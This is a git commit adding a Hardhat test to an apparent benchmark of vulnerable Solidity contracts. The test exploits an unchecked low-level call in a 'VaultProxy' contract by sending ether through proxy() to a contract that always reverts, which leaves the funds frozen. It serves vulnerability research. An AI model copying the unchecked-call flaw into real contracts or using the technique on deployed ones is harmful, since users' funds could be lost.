200134949430455ab8948129a60618f8af839347
Monica Jin <monicachenjin@gmail.com>
2024-09-11 10:33:43 +0200

    add VaultProxy exploit

---
+++ smartbugs-curated/0.4.x/test/unchecked_low_level_calls/0xbaa3de6504690efb064420d89e871c27065cdd52_test.js
@@ -0,0 +1,56 @@
+const { loadFixture } = require('@nomicfoundation/hardhat-network-helpers');
+const { expect } = require('chai');
+
+describe("attack unchecked_low_level_calls/0xbaa3de6504690efb064420d89e871c27065cdd52.sol", function () {
+
+  let onwer;
+
+  async function deployContracts() {
+    [owner] = await ethers.getSigners();
+    const VaultProxy = await ethers.getContractFactory("contracts/dataset/unchecked_low_level_calls/0xbaa3de6504690efb064420d89e871c27065cdd52.sol:VaultProxy");
+    const contract = await VaultProxy.connect(owner).deploy();
+
+    const RevertContract = await ethers.getContractFactory("contracts/unchecked_low_level_calls/revert_contract.sol:RevertContract");
+    const revertContract = await RevertContract.deploy();
+
+    return {contract, revertContract}
+  };
+
+  it("exploit unchecked low level call vulnerability", async function () {
+    const {contract, revertContract} = await loadFixture(deployContracts);
+    const amount = ethers.parseEther("1");
+    await expect(
+      owner.sendTransaction({
+        to: revertContract.target,
+        value: amount,
+      })
+    ).to.be.revertedWith("I always revert!");
+
+    const DepositBalanceBefore = await ethers.provider.getBalance(contract.target);
+    expect(DepositBalanceBefore).to.be.equal(0);
+
+    const RevertBalanceBefore = await ethers.provider.getBalance(revertContract.target);
+    expect(RevertBalanceBefore).to.be.equal(0);
+
+    await expect(contract.connect(owner).proxy(revertContract.target, "0x", {value: amount})).to.not.be.reverted;
+
+    expect(await ethers.provider.getBalance(revertContract.target)).to.be.equal(0);
+    
+    //funds are frozen in the contract
+    expect(await ethers.provider.getBalance(contract.target)).to.be.equal(amount);
+
+
+    await contract.connect(owner).Vault();
+
+    expect(await contract.Owner()).to.be.equal(owner.address);
+    expect(await contract.Deposits(owner.address)).to.be.equal(0);
+    const OwnerBalance = await ethers.provider.getBalance(owner.address);
+    //withdraw won't return the funds sincet the deposit is zero
+    const tx = await contract.connect(owner).withdraw(amount);
+    const receipt = await tx.wait();
+    expect(await ethers.provider.getBalance(owner.address)).to.be.equal(OwnerBalance - receipt.gasUsed * tx.gasPrice);
+
+
+
+  });
+});
